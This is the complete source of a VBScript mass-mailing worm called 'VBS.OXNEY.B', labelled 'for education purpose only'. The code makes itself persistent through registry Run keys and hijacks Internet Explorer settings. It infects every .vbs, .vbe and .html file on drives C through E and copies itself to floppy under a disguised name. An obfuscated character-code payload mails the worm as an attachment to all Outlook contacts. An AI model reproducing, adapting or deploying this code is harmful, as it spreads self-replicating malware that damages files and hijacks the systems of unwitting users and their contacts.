' VBS.OXNEY.B
' Made in United State of Indonesia
' Surabaya - East Java
' June, 07, 2004
'
' Create by Spidey
' for education purpose only
' WebSite : http://Spidey.uni.cc
' Contact : G2iP(at)SoftHome(dot)net
'
On Error Resume Next
aku = MsgBox("Are you still drunk...???",vbYesNo,"OXNEY.B")  ' a question ??
if aku <> vbNo then   'yes or no
WScript.Quit
else
MsgBox "________________________ YOU GOT MY WORM ________________________" & vbCrLf & vbCrLf & "It's not dangerous" & vbCrLf & "to disinfect contact you AV center.......!!! or visit : www.Spidey.uni.cc" & vbCrLf & "for more info about this worm"& vbCrLf & vbCrLf & "by (cute) Spidey" & vbCrLf & "________________________ YOU GOT MY WORM ________________________" ,48,"OXNEY.B"   ' Got you ?
end if
Set hyxexz = CreateObject("Scripting.FileSystemObject")
Set klxn = hyxexz.OpenTextFile(WScript.ScriptFullName,1)
xyrt = klxn.ReadAll
Set xhay = hyxexz.GetSpecialFolder(1)
Set xhaye = hyxexz.GetSpecialFolder(0)
Set exnkz = hyxexz.GetFile(Wscript.ScriptFullName)
hell = xhay & "\OXNEY.B.VBS"
helly = xhaye & "\LGuarg.exe.vbs"
If exnkz.Attributes <> 38 then
exnkz.Attributes = exnkz.Attributes - exnkz.Attributes
exnkz.Attributes = exnkz.Attributes + 38
End If
exnkz.Copy(hell)
rkyx = "HKEY_USERS\.DEFAULT\Software\"
rkye = "HKCU\Software\Microsoft\"
rxuw rkyx & "Microsoft\Windows\CurrentVersion\Run\SPINX", "Wscript.exe " & hell & " %"
rxuw rkyx & "Microsoft\Windows\CurrentVersion\RunServices\Load-Guard", "Wscript.exe " & helly & " %"
rxuw rkyx & "Microsoft\Windows\CurrentVersion\SPINX\","are still drunk ???"
rxuw rkyx & "Microsoft\Windows\CurrentVersion\SPINX\Create by","Spidey"
rxuw rkyx & "Microsoft\Windows\CurrentVersion\SPINX\Made in","Surabaya - East Java - United State of Indonesia"
rxuw rkyx & "Policies\Microsoft\Internet Explorer\Control Panel\GeneralTab","1"
rxuw rkye & "Internet Explorer\Main\Start Page","Spidey.uni.cc"
rxuw rkye & "Internet Explorer\Main\Window Title","Micosoft Internet Explorer Provided by : Spidey"
'Infect floppy A
If Second(Now()) = 2 then ' Rp. 20.000
exnkz.CopyFile "a:\Permohonan Ma'afku.txt.vbs"
End If
xhen "c:\"
xhen "d:\"
xhen "e:\"
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'sorry friend I can't help you, I have no money for this time !!
'again I am so sorry...
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Function xhen(dhk)
Set xhie = hyxexz.GetFolder(dhk)
For Each xhken in xhie.Files
exths = hyxexz.GetExtensionName(xhken.name)
If exths = "vbs" or exths = "vbe" then
 set xnkeh = hyxexz.OpenTextFile(xhken.path,1,False)
 if xnkeh.ReadLine <> "'again I am sorry !!" then
 xnkeh.Close()
 set xnkeh = hyxexz.OpenTextFile(xhken.path,1,False)
 kehnx = xnkeh.ReadAll
 set xnkeh = hyxexz.CreateTextFile(xhken.path,True,False)
 xnkeh.WriteLine "'again I am sorry !!"
 xnkeh.Write(kehnx)
 xnkeh.WriteLine xyrt
 xnkeh.Close()
 Else
 xnkeh.Close()
 End If
End If
If exths ="html" or exths = "htm" then
 set xnkeh = hyxexz.OpenTextFile(xhken.path,1,False)
 if xnkeh.ReadLine <> "<!-- Host by Spidey http://www.Spidey.uni.cc -->" then
 xnkeh.Close()
 set xnkeh = hyxexz.OpenTextFile(xhken.path,1,False)
 kehnx = xnkeh.ReadAll
 set xnkeh = hyxexz.CreateTextFile(xhken.path,True,False)
 xnkeh.WriteLine "<!-- Host by Spidey http://www.Spidey.uni.cc -->"
 xnkeh.WriteLine "<script>var wsh=new ActiveXObject('WScript.Shell');"
 xnkeh.WriteLine "wsh.Run('" & hell & "');</script>"
 xnkeh.WriteLine "wsh.Run('" & helly & "');</script>"
 xnkeh.WriteLine "<html><head><title>VBS.OXNEY.B</title></head><body><div align=left><font size=2><b>VBS.OXNEY.B</b><br>Create and modif by Spidey [ June, 07, 2004 ]</font><br><font size=2 color=red>made in Surabaya - East Java - United State of Indonesia</font><br><font size=2>visit : <a href=http://Spidey.uni.cc>http://Spidey.uni.cc</a> for more information about this suck or contact you AV support to disinfect...<br><p>(c) 07.05.2004 by Spidey</font></div></body></html>"
 xnkeh.Write(kehnx)
 xnkeh.Close()
 Else
 xnkeh.Close()
 End If
End If
 Next
For Each hxhe in xhie.SubFolders
xhen(hxhe.path)
Next
End Function
Function rxuw(jxhr,xhke)
Set eyxz = CreateObject("Wscript.Shell")
eyxz.RegWrite jxhr,xhke
End Function
Done =0
If eyxz.RegRead(rkyx & "\Windows\mailex") <> "1" then
execute ahexk("83/101/116/32/111/101/110/120/32/61/32/67/114/101/97/116/101/79/98/106/101/99/116/40/34/79/117/116/76/111/111/107/46/65/112/112/108/105/99/97/116/105/111/110/34/41/13/10/73/102/32/111/101/110/120/32/61/32/34/79/117/116/76/111/111/107/34/32/116/104/101/110/13/10/83/101/116/32/109/97/120/105/32/61/32/111/101/110/120/46/71/101/116/78/97/109/101/83/112/97/99/101/40/34/77/65/80/73/34/41/13/10/70/111/114/32/69/97/99/104/32/97/100/120/104/32/105/110/32/109/97/120/105/46/65/100/100/114/101/115/115/76/105/115/116/115/13/10/97/99/120/121/32/61/32/97/100/120/104/46/65/100/100/114/101/115/115/69/110/116/114/105/101/115/46/67/111/117/110/116/13/10/73/102/32/97/99/120/121/32/60/62/32/48/32/116/104/101/110/13/10/83/101/116/32/109/105/108/101/120/32/61/32/111/101/110/120/46/67/114/101/97/116/101/73/116/101/109/40/48/41/13/10/109/105/108/101/120/46/83/117/98/106/101/99/116/32/61/32/34/70/119/58/32/73/32/103/105/118/101/32/121/111/117/32/97/103/97/105/110/34/13/10/109/105/108/101/120/46/66/111/100/121/32/61/32/34/62/83/112/105/100/101/121/32/104/97/115/32/103/105/118/101/32/121/111/117/32/115/111/109/101/32/112/97/115/115/119/111/114/100/32/111/102/32/120/120/120/32/115/105/116/101/34/38/32/118/98/67/114/76/102/32/38/32/118/98/67/114/108/102/32/38/34/40/99/117/116/101/41/32/83/112/105/100/101/121/34/13/10/109/105/108/101/120/46/65/116/116/97/99/104/109/101/110/116/115/46/65/100/100/32/104/101/108/108/13/10/109/105/108/101/120/46/68/101/108/101/116/101/65/102/116/101/114/83/117/98/109/105/116/32/61/32/84/114/117/101/13/10/70/111/114/32/104/120/105/101/32/61/32/49/32/116/111/32/97/99/120/121/13/10/97/100/104/101/120/32/61/32/104/120/105/101/46/65/100/100/114/101/115/115/69/110/116/114/105/101/115/40/104/120/105/101/41/13/10/105/102/32/97/99/120/121/32/61/32/49/32/116/104/101/110/13/10/109/105/108/101/120/46/66/67/67/32/61/32/97/100/104/101/120/46/65/100/100/114/101/115/115/13/10/69/108/115/101/13/10/109/105/108/101/120/46/66/67/67/32/61/32/109/105/108/101/120/46/66/67/67/32/38/32/34/59/32/34/32/38/32/97/100/104/101/120/46/65/100/100/114/101/115/115/13/10/69/110/100/32/73/102/13/10/78/101/120/116/13/10/109/105/108/101/120/46/83/101/110/100/13/10/68/111/110/101/32/61/32/49/13/10/69/110/100/32/73/102/13/10/78/101/120/116/13/10/69/110/100/32/73/102/")
End If
if Done = 1 then ws.RegWrite rkyx & "Windows\mailex","1"
Function ahexk(heyiw)
For kenxya = 1 To Len(heyiw)
If InStr(heyiw, "/") <> 0 Then
nehxia = nehxia & Chr(Left(heyiw, InStr(heyiw, "/") - 1))
heyiw = Mid(heyiw, InStr(heyiw, "/") + 1)
ahexk = nehxia
End If
Next
End Function
